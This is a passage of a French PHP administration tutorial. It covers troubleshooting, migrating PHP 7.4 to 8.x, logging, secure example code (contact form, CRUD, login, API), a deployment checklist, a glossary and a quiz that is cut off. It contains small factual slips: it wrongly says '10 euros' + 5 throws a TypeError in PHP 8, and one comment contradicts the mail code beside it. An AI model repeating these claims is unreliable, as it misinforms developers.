# "j'ai déployé mais l'ancien code tourne" → systemctl reload php8.4-fpm (section 58)
```

**Checklist WSOD :** logs pool → `php -l` sur le fichier modifié → droits fichiers (`appli:www-data`, pas root:root 600) → OPcache vidé → `.env` présent → extensions requises (`composer check-platform-reqs`).

---

## 67. Dépannage — cas concret n°3 : lenteurs

```bash
# 1. Slow log : qui rame ?
tail -20 /var/log/php-fpm-appli-slow.log
# "script_filename = /var/www/appli/public/index.php ... mysql_query() ..." → la BDD

# 2. C'est la BDD ? Activer le log des requêtes lentes MariaDB :
# /etc/mysql/mariadb.conf.d/50-server.cnf : slow_query_log=1, long_query_time=2
# Puis : mysqldumpslow /var/log/mysql/slow.log | head -20

# 3. C'est le réseau/appel externe ? (API, LDAP...)
# Mesurer avec curl depuis le serveur :
curl -o /dev/null -s -w "connexion: %{time_connect}s, total: %{time_total}s\n" https://api.externe.fr/health

# 4. Workers occupés par des requêtes longues → file d'attente :
curl -s "http://127.0.0.1/fpm-status-appli?json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['listen queue'], d['active processes'])"
```

**Remèdes par cause :**

| Cause | Remède |
|---|---|
| Requête SQL lente | Index manquant (`EXPLAIN`), pagination, cache |
| Appel HTTP externe synchrone | Timeout court (`CURLOPT_TIMEOUT=5`), file de jobs (cron/worker) |
| `max_children` trop bas | Augmenter (si RAM dispo) |
| OPcache mal réglé | `validate_timestamps=0`, mémoire suffisante |
| Session verrouillée | `session_write_close()` tôt (section 40) |

---

## 68. Les 12 erreurs classiques — diagnostic éclair

| # | Message | Cause la plus probable | Fix |
|---|---|---|---|
| 1 | `Headers already sent by ... :12` | Espace/BOM avant `<?php`, ou `echo` avant `header()`/`session_start()` | Supprimer tout output avant les en-têtes ; pas de `?>` final |
| 2 | `Undefined array key "x"` | Accès tableau sans test | `$_GET['x'] ?? défaut`, `isset()` |
| 3 | `Call to undefined function mb_strlen()` | Extension `php8.4-mbstring` non installée | `apt install php8.4-mbstring` + reload FPM |
| 4 | `Class 'PDO' not found` | `php8.4-mysql`/`php8.4-pgsql` absent | Installer le driver PDO adéquat |
| 5 | `SQLSTATE[HY000] [2002] Connection refused` | MariaDB arrêté, mauvais host/port, pare-feu | `systemctl status mariadb`, tester `mysql -h ... -u ...` |
| 6 | `Access denied for user 'appli'@'...'` | Mauvais mot de passe ou host non autorisé | Vérifier `.env` + `SELECT user,host FROM mysql.user` |
| 7 | `Permission denied` (fopen, move_uploaded_file) | Droits fichiers / `open_basedir` | `chown appli:www-data`, vérifier `open_basedir` |
| 8 | `Allowed memory size exhausted` | `memory_limit` trop bas ou fuite/boucle | Augmenter avec mesure, ou corriger le code (fetch ligne à ligne) |
| 9 | `Maximum execution time exceeded` | Script trop long ou blocage (BDD, HTTP) | Timeout côté cause ; `set_time_limit()` en CLI si légitime |
| 10 | `Failed to open stream: No such file` (include) | Mauvais chemin relatif | Chemins absolus via `__DIR__`, autoloader PSR-4 |
| 11 | `Typed property must not be accessed before initialization` | Propriété typée non initialisée au constructeur | Initialiser dans le constructeur ou `?type` + `= null` |
| 12 | `Cannot modify readonly property` | Assignation après construction | `readonly` = constructeur uniquement ; revoir le design |

---

## 69. Mise à jour PHP 7.4 → 8.x — la procédure

```bash
# 1. INVENTAIRE : quelles applis, quelle version PHP actuelle, quelles extensions ?
php -v && php -m | sort

# 2. AUDIT de compatibilité (outil officiel : rector en mode dry-run, ou phpstan)
composer require --dev rector/rector
vendor/bin/rector process src --dry-run --config=rector-74-to-84.php

# 3. Tester en STAGING : installer PHP 8.x en parallèle (les paquets cohabitent : php7.4-fpm + php8.4-fpm)
sudo apt install php8.4-fpm php8.4-mysql php8.4-mbstring # + extensions de l'appli
# Dupliquer le pool FPM en 8.4, faire pointer un vhost de test dessus

# 4. Corriger les incompatibilités (section 70), lancer les tests
vendor/bin/phpunit

# 5. BASCULE : changer le fastcgi_pass du vhost prod vers le socket 8.4
#    Garder le pool 7.4 une semaine en cas de rollback

# 6. NETTOYAGE (après validation) : apt remove php7.4*
```

⚠️ **Jamais** de mise à jour PHP un vendredi à 17h. Fenêtre de maintenance annoncée, backup avant, rollback préparé (pool précédent conservé).

---

## 70. Migration 7.4 → 8.x — breaking changes à connaître

```php
<?php
// --- 1. Comparaisons string/nombre : "0 == 'foo'" ---
var_dump(0 == "foo"); // PHP 7 : true (!!) — PHP 8 : false ✅ (comparaison numérique seulement si la string est numérique)

// --- 2. Division par zéro ---
var_dump(1/0);        // PHP 7 : warning + INF — PHP 8 : DivisionByZeroError (exception !)
intdiv(1, 0);        // DivisionByZeroError dans les deux versions

// --- 3. match remplace switch (pas de fall-through, === strict) --- voir section 13

// --- 4. Paramètres nommés : les noms des paramètres des fonctions INTERNES peuvent changer ---
// htmlentities($s, ENT_QUOTES, 'UTF-8') reste valide, mais évite de nommer les args des fonctions natives.

// --- 5. each() supprimé (depuis 8.0), create_function() supprimé, money_format() supprimé ---
// Remplacements : foreach, closures, NumberFormatter (intl)

// --- 6. curly braces $str{0} : syntaxe supprimée → $str[0] ---

// --- 7. Type juggling en arithmétique : "10 euros" + 5 ---
// PHP 7 : 15 (notice) — PHP 8 : TypeError si non numérique ("euros" n'est pas numérique)

// --- 8. str_contains/str_starts_with/str_ends_with (8.0) : remplace strpos(...) !== false ---

// --- 9. get_magic_quotes_gpc() supprimé, magic quotes disparus depuis longtemps ---
// Si du vieux code fait stripslashes($_POST[...]) systématiquement : bug en 8.x → supprimer.

// --- 10. PDO : les erreurs par défaut restent silencieuses si ERRMODE non défini ---
// (pas un breaking change, mais l'occasion de passer en ERRMODE_EXCEPTION — section 44)
```

📋 **Ordre de migration conseillé :** 7.4 → 8.0 (gros changements) → 8.1/8.2/8.3/8.4 (incrémental, enums puis readonly puis...). Tester chaque palier.

---

## 71. Debug — Xdebug et les logs applicatifs

```bash
# Xdebug : UNIQUEMENT en dev/staging, JAMAIS en prod (divise les perfs par 2-3)
sudo apt install php8.4-xdebug
# /etc/php/8.4/fpm/conf.d/20-xdebug.ini — en DEV :
# xdebug.mode=debug
# xdebug.start_with_request=yes
# xdebug.client_host=127.0.0.1
# En prod : xdebug.mode=off (ou paquet désinstallé)
```

```php
<?php declare(strict_types=1);

// --- En prod, le "debug" = logs structurés ---
// Monolog (standard de fait) : composer require monolog/monolog
use Monolog\Logger;
use Monolog\Handler\StreamHandler;

$log = new Logger('appli');
$log->pushHandler(new StreamHandler('/var/log/appli.log', Logger::INFO));

$log->info('Intervention créée', ['id' => $id, 'site' => $site, 'user' => $userId]);
$log->warning('Charge onduleur élevée', ['charge' => 87.5, 'seuil' => 80]);
$log->error('Échec paiement', ['exception' => $e->getMessage()]);
// Contexte en tableau = requêtes grep/jq efficaces sur les logs JSON

// --- Handler JSON pour centralisation (Loki/ELK) ---
use Monolog\Handler\StreamHandler;
use Monolog\Formatter\JsonFormatter;
$h = new StreamHandler('/var/log/appli.json.log', Logger::DEBUG);
$h->setFormatter(new JsonFormatter());

// --- Debug rapide SANS xdebug : backtrace ciblée ---
debug_print_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS); // qui appelle cette fonction ?
```

**En staging avec Xdebug :** step-debug dans VS Code (extension PHP Debug, `launch.json` port 9003), profiler avec `xdebug.mode=profile` + cachegrind pour trouver les fonctions gourmandes.

---

## 72. Cas pratique n°1 — formulaire de contact sécurisé

Le classique, fait **correctement** : validation, CSRF, PRG, anti-spam honeypot, envoi mail sécurisé.

```php
<?php declare(strict_types=1);
// public/contact.php
session_start();
require __DIR__ . '/../bootstrap.php'; // error handlers, config, PDO (sections 34, 44)

/* ---------- CSRF ---------- */
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

/* ---------- TRAITEMENT ---------- */
$erreurs = [];
$valeurs = ['nom' => '', 'email' => '', 'message' => ''];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1. CSRF
    if (!hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'] ?? '')) {
        http_response_code(403);
        exit('Jeton invalide.');
    }

    // 2. Honeypot anti-bot (champ caché : rempli = robot)
    if (!empty($_POST['site_web'])) {
        // On fait semblant que ça marche (ne pas informer le bot)
        header('Location: contact.php?ok=1');
        exit;
    }

    // 3. Validation
    $valeurs['nom']     = trim($_POST['nom'] ?? '');
    $valeurs['email']    = trim($_POST['email'] ?? '');
    $valeurs['message']  = trim($_POST['message'] ?? '');

    if (mb_strlen($valeurs['nom']) < 2 || mb_strlen($valeurs['nom']) > 80) {
        $erreurs['nom'] = 'Nom requis (2-80 caractères).';
    }
    if (!filter_var($valeurs['email'], FILTER_VALIDATE_EMAIL)) {
        $erreurs['email'] = 'E-mail invalide.';
    }
    if (mb_strlen($valeurs['message']) < 10 || mb_strlen($valeurs['message']) > 5000) {
        $erreurs['message'] = 'Message entre 10 et 5000 caractères.';
    }

    // 4. Enregistrement + envoi
    if ($erreurs === []) {
        $stmt = $pdo->prepare(
            'INSERT INTO contacts (nom, email, message, cree_le) VALUES (:nom, :email, :message, NOW())'
        );
        $stmt->execute([
            'nom'     => $valeurs['nom'],
            'email'   => $valeurs['email'],
            'message' => $valeurs['message'], // stocké BRUT, échappé à l'affichage
        ]);

        // E-mail : en-têtes SANS injection (pas de \r\n utilisateur dans les headers)
        $sujet = 'Nouveau contact : ' . mb_substr(str_replace(["\r", "\n"], '', $valeurs['nom']), 0, 60);
        mail('contact@entreprise.fr', $sujet, $valeurs['message'],
            "From: noreply@entreprise.fr\r\nReply-To: noreply@entreprise.fr\r\nContent-Type: text/plain; charset=UTF-8");
        // Note : Reply-To = adresse saisie UNIQUEMENT après validation FILTER_VALIDATE_EMAIL (fait plus haut)

        header('Location: contact.php?ok=1'); // PRG
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"><title>Contact</title></head>
<body>
<?php if (isset($_GET['ok'])): ?>
    <p>Message envoyé, merci.</p>
<?php else: ?>
    <form method="post" action="contact.php" novalidate>
        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
        <!-- honeypot : invisible pour l'humain -->
        <div style="display:none"><input type="text" name="site_web" value="" autocomplete="off"></div>

        <label>Nom : <input type="text" name="nom" value="<?= htmlspecialchars($valeurs['nom']) ?>" required></label>
        <?php if (isset($erreurs['nom'])): ?><span><?= htmlspecialchars($erreurs['nom']) ?></span><?php endif; ?>

        <label>E-mail : <input type="email" name="email" value="<?= htmlspecialchars($valeurs['email']) ?>" required></label>
        <?php if (isset($erreurs['email'])): ?><span><?= htmlspecialchars($erreurs['email']) ?></span><?php endif; ?>

        <label>Message : <textarea name="message" required><?= htmlspecialchars($valeurs['message']) ?></textarea></label>
        <?php if (isset($erreurs['message'])): ?><span><?= htmlspecialchars($erreurs['message']) ?></span><?php endif; ?>

        <button type="submit">Envoyer</button>
    </form>
<?php endif; ?>
</body>
</html>
```

**Ce que ce code fait bien :** CSRF, validation serveur stricte, honeypot, PRG, stockage brut + échappement affichage, en-têtes mail sans injection CRLF, `htmlspecialchars` partout.

---

## 73. Cas pratique n°2 — mini CRUD avec PDO

CRUD complet sur `equipements(id, reference, type, emplacement)` — lister, créer, modifier, supprimer, avec CSRF et PRG.

```php
<?php declare(strict_types=1);
// public/equipements.php — LISTE + SUPPRESSION
session_start();
require __DIR__ . '/../bootstrap.php';

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// --- SUPPRESSION (POST + CSRF, jamais GET) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'supprimer') {
    if (!hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'] ?? '')) {
        http_response_code(403);
        exit('Jeton invalide.');
    }
    $id = filter_input(INPUT_POST, 'id', FILTER_VALIDATE_INT);
    if ($id !== false && $id !== null) {
        $stmt = $pdo->prepare('DELETE FROM equipements WHERE id = ?');
        $stmt->execute([$id]);
    }
    header('Location: equipements.php');
    exit;
}

// --- LISTE paginée ---
$page = max(1, (int) ($_GET['page'] ?? 1));
$parPage = 20;
$total = (int) $pdo->query('SELECT COUNT(*) FROM equipements')->fetchColumn();
$pages = (int) ceil($total / $parPage);

$stmt = $pdo->prepare('SELECT id, reference, type, emplacement FROM equipements ORDER BY id DESC LIMIT :lim OFFSET :off');
$stmt->bindValue(':lim', $parPage, PDO::PARAM_INT);
$stmt->bindValue(':off', ($page - 1) * $parPage, PDO::PARAM_INT);
$stmt->execute();
$equipements = $stmt->fetchAll();
?>
<h1>Équipements (<?= $total ?>)</h1>
<p><a href="equipement-form.php">+ Nouvel équipement</a></p>
<table border="1">
    <tr><th>Référence</th><th>Type</th><th>Emplacement</th><th>Actions</th></tr>
    <?php foreach ($equipements as $eq): ?>
    <tr>
        <td><?= htmlspecialchars($eq['reference']) ?></td>
        <td><?= htmlspecialchars($eq['type']) ?></td>
        <td><?= htmlspecialchars($eq['emplacement']) ?></td>
        <td>
            <a href="equipement-form.php?id=<?= (int) $eq['id'] ?>">Modifier</a>
            <form method="post" style="display:inline"
                  onsubmit="return confirm('Supprimer <?= htmlspecialchars($eq['reference']) ?> ?');">
                <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                <input type="hidden" name="action" value="supprimer">
                <input type="hidden" name="id" value="<?= (int) $eq['id'] ?>">
                <button type="submit">Supprimer</button>
            </form>
        </td>
    </tr>
    <?php endforeach; ?>
</table>
<p>Page <?= $page ?> / <?= max(1, $pages) ?></p>
```

```php
<?php declare(strict_types=1);
// public/equipement-form.php — CRÉATION + MODIFICATION
session_start();
require __DIR__ . '/../bootstrap.php';

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
$eq = ['reference' => '', 'type' => '', 'emplacement' => ''];
if ($id) {
    $stmt = $pdo->prepare('SELECT reference, type, emplacement FROM equipements WHERE id = ?');
    $stmt->execute([$id]);
    $eq = $stmt->fetch() ?: $eq;
}

$erreurs = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'] ?? '')) {
        http_response_code(403);
        exit('Jeton invalide.');
    }

    $eq['reference']   = trim($_POST['reference'] ?? '');
    $eq['type']        = trim($_POST['type'] ?? '');
    $eq['emplacement'] = trim($_POST['emplacement'] ?? '');

    if (!preg_match('/^[A-Z0-9-]{3,20}$/', $eq['reference'])) {
        $erreurs[] = 'Référence : 3-20 caractères (A-Z, 0-9, tiret).';
    }
    $typesAutorises = ['onduleur', 'clim', 'groupe', 'tdbt'];
    if (!in_array($eq['type'], $typesAutorises, true)) {
        $erreurs[] = 'Type invalide.';
    }
    if (mb_strlen($eq['emplacement']) > 100) {
        $erreurs[] = 'Emplacement trop long.';
    }

    if ($erreurs === []) {
        try {
            if ($id) {
                $stmt = $pdo->prepare(
                    'UPDATE equipements SET reference = :r, type = :t, emplacement = :e WHERE id = :id'
                );
                $stmt->execute(['r' => $eq['reference'], 't' => $eq['type'], 'e' => $eq['emplacement'], 'id' => $id]);
            } else {
                $stmt = $pdo->prepare(
                    'INSERT INTO equipements (reference, type, emplacement) VALUES (:r, :t, :e)'
                );
                $stmt->execute(['r' => $eq['reference'], 't' => $eq['type'], 'e' => $eq['emplacement']]);
            }
            header('Location: equipements.php');
            exit;
        } catch (PDOException $e) {
            if ($e->getCode() === '23000') {
                $erreurs[] = 'Cette référence existe déjà.';
            } else {
                throw $e; // remonte au handler global (section 34)
            }
        }
    }
}
?>
<h1><?= $id ? 'Modifier' : 'Nouvel' ?> équipement</h1>
<?php foreach ($erreurs as $err): ?><p style="color:red"><?= htmlspecialchars($err) ?></p><?php endforeach; ?>
<form method="post">
    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
    <label>Référence : <input name="reference" value="<?= htmlspecialchars($eq['reference']) ?>" required></label><br>
    <label>Type :
        <select name="type">
            <?php foreach (['onduleur', 'clim', 'groupe', 'tdbt'] as $t): ?>
                <option value="<?= $t ?>" <?= $t === $eq['type'] ? 'selected' : '' ?>><?= $t ?></option>
            <?php endforeach; ?>
        </select>
    </label><br>
    <label>Emplacement : <input name="emplacement" value="<?= htmlspecialchars($eq['emplacement']) ?>" maxlength="100"></label><br>
    <button type="submit">Enregistrer</button>
</form>
```

---

## 74. Cas pratique n°3 — page de login sécurisée

```php
<?php declare(strict_types=1);
// public/login.php
session_start();
require __DIR__ . '/../bootstrap.php';

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Déjà connecté ? → espace privé
if (!empty($_SESSION['utilisateur_id'])) {
    header('Location: dashboard.php');
    exit;
}

$erreur = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'] ?? '')) {
        http_response_code(403);
        exit('Jeton invalide.');
    }

    $login = trim($_POST['login'] ?? '');
    $mdp   = $_POST['mdp'] ?? '';

    // --- Anti brute-force : compteur par login (table login_tentatives) ---
    $stmt = $pdo->prepare(
        "SELECT COUNT(*) FROM login_tentatives WHERE login = ? AND date_heure > DATE_SUB(NOW(), INTERVAL 15 MINUTE)"
    );
    $stmt->execute([$login]);
    if ((int) $stmt->fetchColumn() >= 5) {
        $erreur = 'Compte temporairement verrouillé (trop de tentatives). Réessayez dans 15 minutes.';
    } else {
        $stmt = $pdo->prepare('SELECT id, hash_mdp, role, actif FROM utilisateurs WHERE login = ?');
        $stmt->execute([$login]);
        $user = $stmt->fetch();

        if ($user && (int) $user['actif'] === 1 && password_verify($mdp, $user['hash_mdp'])) {
            // --- Succès ---
            $pdo->prepare('DELETE FROM login_tentatives WHERE login = ?')->execute([$login]);

            // Re-hachage si nécessaire
            if (password_needs_rehash($user['hash_mdp'], PASSWORD_DEFAULT)) {
                $pdo->prepare('UPDATE utilisateurs SET hash_mdp = ? WHERE id = ?')
                    ->execute([password_hash($mdp, PASSWORD_DEFAULT), $user['id']]);
            }

            session_regenerate_id(true); // 🔒 anti-fixation
            $_SESSION['utilisateur_id'] = (int) $user['id'];
            $_SESSION['role'] = $user['role'];
            $_SESSION['derniere_activite'] = time();
            $_SESSION['empreinte'] = hash('sha256', $_SERVER['HTTP_USER_AGENT'] ?? '');

            header('Location: dashboard.php');
            exit;
        }

        // --- Échec : on loggue la tentative (sans dire pourquoi ça a échoué) ---
        $pdo->prepare('INSERT INTO login_tentatives (login, ip, date_heure) VALUES (?, ?, NOW())')
            ->execute([$login, $_SERVER['REMOTE_ADDR'] ?? '']);
        // Délai volontaire anti-énumération rapide
        sleep(1);
        $erreur = 'Identifiants invalides.'; // message GÉNÉRIQUE
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"><title>Connexion</title></head>
<body>
<h1>Connexion</h1>
<?php if ($erreur): ?><p style="color:red"><?= htmlspecialchars($erreur) ?></p><?php endif; ?>
<form method="post" action="login.php" autocomplete="off">
    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
    <label>Identifiant : <input type="text" name="login" required autofocus></label><br>
    <label>Mot de passe : <input type="password" name="mdp" required></label><br>
    <button type="submit">Se connecter</button>
</form>
</body>
</html>
```

```php
<?php declare(strict_types=1);
// dashboard.php — page protégée (modèle à inclure en tête de chaque page privée)
session_start();
require __DIR__ . '/../bootstrap.php';

if (empty($_SESSION['utilisateur_id'])) {
    header('Location: login.php');
    exit;
}
// Timeout d'inactivité (section 41)
if (time() - ($_SESSION['derniere_activite'] ?? 0) > 1800) {
    require __DIR__ . '/logout.php'; // qui fait deconnexion() + redirection
}
$_SESSION['derniere_activite'] = time();
```

**Ce que ce login fait bien :** CSRF, `password_verify`, message générique, anti brute-force (5/15 min), `session_regenerate_id(true)`, re-hachage auto, timeout, empreinte UA. **Manque pour aller plus loin :** 2FA TOTP (lib `robthree/twofactorauth`), rate-limit par IP via fail2ban.

---

## 75. Cas pratique n°4 — mini API JSON

```php
<?php declare(strict_types=1);
// public/api/equipements.php — GET /api/equipements.php?type=onduleur
require __DIR__ . '/../../bootstrap.php';

header('Content-Type: application/json; charset=UTF-8');

// --- Auth simple par clé API (header) ---
$cle = $_SERVER['HTTP_X_API_KEY'] ?? '';
$stmt = $pdo->prepare('SELECT id FROM api_cles WHERE cle_hash = ? AND active = 1');
$stmt->execute([hash('sha256', $cle)]); // on stocke le hash, pas la clé en clair
if (!$stmt->fetch()) {
    http_response_code(401);
    echo json_encode(['erreur' => 'Clé API invalide.']);
    exit;
}

// --- Paramètres validés ---
$type = $_GET['type'] ?? null;
$typesAutorises = ['onduleur', 'clim', 'groupe', 'tdbt'];
if ($type !== null && !in_array($type, $typesAutorises, true)) {
    http_response_code(400);
    echo json_encode(['erreur' => 'Type invalide.']);
    exit;
}

$sql = 'SELECT id, reference, type, emplacement FROM equipements';
$params = [];
if ($type !== null) {
    $sql .= ' WHERE type = :type';
    $params['type'] = $type;
}
$stmt = $pdo->prepare($sql);
$stmt->execute($params);

echo json_encode(
    ['donnees' => $stmt->fetchAll()],
    JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR
);
```

Test : `curl -s -H "X-API-Key: <cle>" "https://appli.entreprise.fr/api/equipements.php?type=onduleur" | python3 -m json.tool`


---

## 76. Checklist de mise en production — le rituel

📋 **À dérouler à chaque déploiement / nouvelle appli :**

**Avant**
- [ ] Backup code + BDD à jour et **restauré une fois en test**
- [ ] `composer install --no-dev --optimize-autoloader` (pas `update`)
- [ ] `composer audit` : 0 vulnérabilité critique
- [ ] `php -l` sur tous les fichiers modifiés (ou `composer lint`)
- [ ] Tests automatisés au vert (si existants)
- [ ] `.env` prod présent, `APP_ENV=prod`, `APP_DEBUG=false`
- [ ] Fenêtre de maintenance annoncée si interruption

**Pendant**
- [ ] Déploiement : `git pull` / rsync par utilisateur `deploy` (jamais root sur les fichiers web)
- [ ] `composer dump-autoload --optimize`
- [ ] Migrations BDD jouées (script versionné, jamais à la main en prod)
- [ ] `systemctl reload php8.4-fpm` (vide OPcache)
- [ ] Droits : `chown -R appli:www-data`, `find -type d -exec chmod 750`, fichiers `640`, `public/` seul en lecture web

**Après**
- [ ] Page d'accueil + login + 1 parcours critique testés en HTTPS
- [ ] `curl -I` : en-têtes sécurité présents, pas de `X-Powered-By`
- [ ] Logs : 0 fatal/warning dans les 15 min (`tail -f` pool + nginx)
- [ ] Status FPM : `listen queue = 0`, workers OK
- [ ] Rollback prêt : commit précédent taggé, dump pré-déploiement conservé

---

## 77. Pense-bête de poche — une page

```php
// --- Base ---
$e = fn(string $s): string => htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); // anti-XSS
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);                 // entrée validée

// --- BDD : toujours préparé ---
$stmt = $pdo->prepare('SELECT * FROM t WHERE id = :id');
$stmt->execute(['id' => $id]);
$lignes = $stmt->fetchAll();

// --- CSRF ---
$_SESSION['csrf_token'] ??= bin2hex(random_bytes(32));                    // génération
hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '');         // vérif

// --- Mots de passe ---
$hash = password_hash($mdp, PASSWORD_DEFAULT);   // création
password_verify($mdp, $hash);                    // vérif

// --- Dates ---
$d = new DateTimeImmutable('now', new DateTimeZone('Europe/Paris'));
echo $d->format('Y-m-d H:i:s');

// --- Redirection ---
header('Location: /cible.php'); exit;

// --- JSON ---
$json = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR);
$data = json_decode($json, true, 512, JSON_THROW_ON_ERROR);

// --- Fichiers ---
file_put_contents($f, $contenu, FILE_APPEND | LOCK_EX);
$lignes = file($f, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
```

```bash
# --- Serveur ---
systemctl reload php8.4-fpm          # après modif ini/pool/déploiement
nginx -t && systemctl reload nginx   # après modif vhost
tail -f /var/log/php-fpm-appli-error.log
curl -s "http://127.0.0.1/fpm-status-appli?json" | python3 -m json.tool
php -l fichier.php                   # lint avant déploiement
composer install --no-dev --optimize-autoloader
```

---

## 78. Scripts utiles du sysadmin PHP

```php
<?php declare(strict_types=1);
// /usr/local/bin/health-check.php — cron toutes les 5 min, alerte si KO
$checks = [];

// 1. PHP-FPM répond ?
$ping = @file_get_contents('http://127.0.0.1/fpm-ping-appli');
$checks['fpm'] = ($ping === 'pong');

// 2. BDD joignable ?
try {
    $pdo = new PDO('mysql:host=127.0.0.1;dbname=appli;charset=utf8mb4', 'monitor', $_ENV['DB_MONITOR_PASS'],
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 3]);
    $pdo->query('SELECT 1');
    $checks['bdd'] = true;
} catch (Throwable) {
    $checks['bdd'] = false;
}

// 3. Espace disque < 85 % ?
$checks['disque'] = disk_free_space('/') / disk_total_space('/') > 0.15;

// 4. OPcache sain (hit rate > 90 %) ?
$st = opcache_get_status(false);
$checks['opcache'] = ($st['opcache_statistics']['opcache_hit_rate'] ?? 0) > 90;

$ko = array_keys(array_filter($checks, fn(bool $v): bool => !$v));
if ($ko !== []) {
    $msg = 'ALERTE appli : ' . implode(', ', $ko) . ' en échec';
    error_log($msg);
    mail('astreinte@entreprise.fr', '[ALERTE] appli', $msg);
    exit(1);
}
echo "OK\n";
```

```bash
#!/bin/bash
# purge-sessions.sh — nettoie les vieux fichiers de session si save_path en fichiers
find /var/lib/php/sessions -type f -cmin +1440 -delete
# (PHP le fait via le cron système ; utile si session.save_path custom par pool)
```

```php
<?php declare(strict_types=1);
// gen-api-key.php — CLI : génère une clé API (affiche la clé UNE fois, stocke le hash)
$cle = bin2hex(random_bytes(32));
$hash = hash('sha256', $cle);
$pdo->prepare('INSERT INTO api_cles (nom, cle_hash, active) VALUES (?, ?, 1)')
    ->execute([$argv[1] ?? 'sans-nom', $hash]);
echo "Clé (à copier MAINTENANT, non récupérable) : $cle\n";
```

---

## 79. Glossaire

| Terme | Définition |
|---|---|
| **SAPI** | Interface d'exécution de PHP : CLI, FPM, (anciennement mod_php). Chaque SAPI a son php.ini. |
| **PHP-FPM** | FastCGI Process Manager : gère des pools de workers PHP pour nginx/Apache. |
| **Pool** | Groupe de workers FPM dédié à un site, avec son utilisateur système et sa config. |
| **Worker** | Processus PHP qui traite une requête à la fois. |
| **OPcache** | Cache de bytecode : évite de recompiler les scripts à chaque requête. |
| **PDO** | PHP Data Objects : couche d'accès BDD unifiée (MySQL, PgSQL, SQLite...). |
| **Requête préparée** | Requête SQL où données et structure sont séparées → anti-injection SQL. |
| **XSS** | Cross-Site Scripting : injection de JS via des données non échappées. |
| **CSRF** | Cross-Site Request Forgery : action exécutée à l'insu de l'utilisateur connecté. |
| **LFI/RFI** | Inclusion de fichier local/distant : exécution via `include` d'un chemin contrôlé par l'attaquant. |
| **Whitelist** | Liste de valeurs autorisées (l'inverse : blacklist = liste d'interdits, fragile). |
| **PRG** | Post/Redirect/Get : rediriger après un POST pour éviter le double envoi. |
| **Hachage (mot de passe)** | `password_hash` : fonction lente et salée (bcrypt/Argon2), à sens unique. |
| **Salage** | Aléa unique ajouté avant hachage (géré automatiquement par `password_hash`). |
| **Timing attack** | Attaque qui déduit un secret en mesurant le temps de comparaison → parée par `hash_equals`. |
| **HMAC** | Code d'authentification par clé (ici : signer les cookies). |
| **Composer** | Gestionnaire de dépendances PHP (`composer.json` = déclaration, `composer.lock` = versions figées). |
| **PSR-4** | Convention d'autoloading : namespace ↔ arborescence de dossiers. |
| **Namespace** | Espace de nom : organise les classes (`App\Supervision\Sonde`). |
| **Trait** | Bloc de méthodes réutilisable entre classes sans héritage. |
| **Enum** | Type énuméré : ensemble fermé de valeurs (PHP 8.1). |
| **Closure** | Fonction anonyme stockable dans une variable. |
| **Arrow function** | Closure courte `fn($x) => ...` avec capture automatique (PHP 7.4). |
| **strict_types** | `declare(strict_types=1)` : refuse les conversions de types silencieuses. |
| **DTO** | Data Transfer Object : objet simple qui transporte des données typées. |
| **Slow log** | Log FPM des requêtes dépassant `request_slowlog_timeout`. |
| **HSTS** | En-tête qui force le navigateur à n'utiliser que HTTPS. |
| **CSP** | Content-Security-Policy : restreint les sources de scripts/styles/images. |
| **2FA/TOTP** | Double authentification par code temporaire (application authenticator). |

---

## 80. Quiz — 10 questions + réponses

**Q1.** Quelle est la différence entre `==` et `===` ? Lequel utiliser par défaut ?
> `==` compare avec conversion de type (`"42" == 42` → true), `===` exige type + valeur identiques. Utiliser `===` par défaut.

**Q2.** Pourquoi `display_errors` doit être à `Off` en production ?
> Pour ne pas exposer aux visiteurs les chemins, requêtes SQL, versions et stack traces. Les erreurs vont dans `log_errors` (fichier), jamais à l'écran.

**Q3.** Qu'est-ce qu'une requête préparée et pourquoi est-ce « le seul moyen » contre les injections SQL ?
> La requête et les données sont envoyées séparément au serveur SQL : les données ne peuvent jamais être interprétées comme du code. Aucun échappement manuel n'est aussi fiable.

**Q4.** Un attaquant peut-il passer `ORDER BY` en paramètre lié (`:tri`) ? Comment trier dynamiquement sans faille ?
> Non, les paramètres liés ne remplacent que des **valeurs**, pas la structure SQL. Solution : whitelist de colonnes autorisées + `in_array(..., true)`.

**Q5.** À quoi sert `session_regenerate_id(true)` et quand l'appeler ?
> Anti-fixation de session : à appeler à chaque changement de privilège (login). Le `true` supprime l'ancien fichier de session.

**Q6.** Pourquoi ne faut-il jamais utiliser `$_FILES['x']['type']` pour valider un upload ?
